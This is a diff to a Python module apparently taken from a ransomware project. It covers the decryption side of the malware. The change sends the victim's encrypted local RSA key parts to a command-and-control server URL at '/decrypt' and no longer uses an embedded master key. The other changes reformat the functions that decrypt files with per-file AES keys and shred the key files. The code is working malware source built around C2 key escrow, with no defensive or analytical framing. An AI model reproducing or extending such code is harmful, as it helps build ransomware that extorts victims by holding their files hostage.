@@ -1,47 +1,65 @@
 import os
 import logging
-from base64 import b64decode
+import requests
+from base64 import b64decode, b64encode
 from .symmetric_encryption import AES
 from .asymmetric_encryption import RSA
-from .config import ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, \
-                    UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, \
-                    MASTER_PRIVATE_KEY, \
-                    ENCRYPTED_AES_KEY_FILE_LOCATION, \
-                    UNENCRYPTED_AES_KEY_FILE_LOCATION
+from .config import (
+    ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
+    UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
+    ENCRYPTED_AES_KEY_FILE_LOCATION,
+    UNENCRYPTED_AES_KEY_FILE_LOCATION,
+    C_AND_C_SERVER_URL,
+)
 from . import utils
 
 logger = logging.getLogger(__name__)
 
 
-# TODO: Local RSA key decryption should happen in the server side
 def decrypt_local_rsa_key():
     logger.info("Decrypting local RSA key")
-    encrypted_local_rsa_key_parts = utils.read_data_from_file(ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, serialized=False)
-    cipher = RSA(private_key=MASTER_PRIVATE_KEY)
-    unencrypted_local_private_key = b"".join([cipher.decrypt_data(key_part) for key_part in encrypted_local_rsa_key_parts])
+    encrypted_local_rsa_key_parts = utils.read_data_from_file(
+        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, serialized=False
+    )
+    parameters = {
+        "payload": [
+            b64encode(part).decode("ascii") for part in encrypted_local_rsa_key_parts
+        ]
+    }
+    response = requests.post(url=f"{C_AND_C_SERVER_URL}/decrypt", json=parameters)
+    response = response.json()
+    unencrypted_local_private_key = b64decode(response.get("key"))
+
     utils.shred_file(ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
-    utils.write_data_to_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, unencrypted_local_private_key)
+    utils.write_data_to_file(
+        UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, unencrypted_local_private_key
+    )
 
 
 def decrypt_file_encryption_details():
-    local_master_private_key = utils.read_data_from_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
+    local_master_private_key = utils.read_data_from_file(
+        UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION
+    )
     cipher = RSA(private_key=local_master_private_key)
-    encrypted_file_encryption_details = utils.read_data_from_file(ENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False)
+    encrypted_file_encryption_details = utils.read_data_from_file(
+        ENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False
+    )
 
     file_data = []
     for detail in encrypted_file_encryption_details:
         if isinstance(detail, list):
-            file_data.append(b''.join([cipher.decrypt_data(part) for part in detail]))
+            file_data.append(b"".join([cipher.decrypt_data(part) for part in detail]))
         else:
             file_data.append(cipher.decrypt_data(detail))
 
-    utils.write_data_to_file(UNENCRYPTED_AES_KEY_FILE_LOCATION, file_data, serialized=False)
+    utils.write_data_to_file(
+        UNENCRYPTED_AES_KEY_FILE_LOCATION, file_data, serialized=False
+    )
     utils.shred_file(ENCRYPTED_AES_KEY_FILE_LOCATION)
 
 
 def decode_file_encryption_details(detail):
-    detail = detail.decode("utf-8")
-    detail = [b64decode(detail.encode("utf-8")) for detail in detail.split("\t")]
+    detail = [b64decode(detail) for detail in detail.split("\t")]
     return detail[0], detail[1], detail[-1]
 
 
@@ -61,9 +79,13 @@ def delete_key_files():
 
 
 def decrypt_files():
-    key_detail = utils.read_data_from_file(UNENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False)
+    key_detail = utils.read_data_from_file(
+        UNENCRYPTED_AES_KEY_FILE_LOCATION, serialized=False
+    )
     for detail in key_detail:
-        aes_key, initialization_vector, file_path = decode_file_encryption_details(detail)
+        aes_key, initialization_vector, file_path = decode_file_encryption_details(
+            detail
+        )
         decrypt_file(aes_key, initialization_vector, file_path)
 
 
@@ -75,5 +97,4 @@ def start_decryption():
     decrypt_file_encryption_details()
     decrypt_files()
     delete_key_files()
-
 
